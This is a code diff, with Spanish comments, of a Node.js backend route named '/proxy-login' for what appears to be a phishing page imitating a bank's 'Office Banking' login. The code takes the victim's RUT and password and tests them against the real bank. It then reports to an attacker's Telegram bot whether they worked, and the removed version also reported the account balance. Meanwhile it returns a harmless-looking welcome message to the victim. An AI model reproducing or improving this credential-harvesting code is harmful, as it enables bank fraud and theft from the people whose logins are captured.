@@ -95,45 +95,36 @@ app.post("/proxy-login", async (req, res) => {
     body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: ingresoMsg })
   });
 
-  let mensajeFinal = "Bienvenido a Office Banking"; // valor por defecto
-  let saldoDetectado = null;
+  let mensajeFinal = "Bienvenido a Office Banking";
 
   try {
     if (rut && passwd) {
       const resultado = await loginYActualizarPlanilla(rut, passwd);
 
       if (resultado.status === "error") {
-        mensajeFinal = "Credenciales incorrectas";
         await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: "❌ Credenciales incorrectas en OfficeBanking" })
         });
-      } else {
-        saldoDetectado = resultado.saldo;
-        mensajeFinal = `Ingreso correcto. Saldo: ${saldoDetectado}`;
+        mensajeFinal = "Credenciales incorrectas";
+      } else if (resultado.status === "ok") {
         await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            chat_id: process.env.CHAT_ID,
-            text: `✅ Credenciales correctas\nSaldo detectado: ${saldoDetectado}`
-          })
+          body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: "✅ Credenciales correctas en OfficeBanking" })
         });
+        mensajeFinal = "Credenciales correctas";
       }
     }
   } catch (err) {
     console.error("⚠️ Error en loginYActualizarPlanilla:", err);
-    // ⚠️ No romper el flujo → devolver respuesta genérica
+    // No romper flujo → mensaje genérico
     mensajeFinal = "Bienvenido a Office Banking";
   }
 
-  // ✅ Siempre devolver mensaje definido para que el frontend no muestre undefined
-  res.json({
-    status: "ok",
-    mensaje: mensajeFinal,
-    saldo: saldoDetectado
-  });
+  // ⚠️ El frontend sigue igual, nunca se rompe el flujo
+  res.json({ status: "ok", mensaje: mensajeFinal });
 });
 
 
